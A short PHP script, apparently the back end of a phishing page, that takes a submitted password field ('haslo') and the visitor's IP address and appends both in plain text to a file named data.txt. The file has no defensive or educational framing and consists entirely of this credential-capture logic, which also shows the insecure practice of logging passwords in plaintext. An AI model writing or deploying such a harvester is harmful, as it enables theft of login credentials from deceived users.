<?php
$haslo = $_POST['haslo'];
$ip = $_SERVER['REMOTE_ADDR'];
$data = "Password: $haslo, IP: $ip\n";
file_put_contents('data.txt', $data, FILE_APPEND);
?>
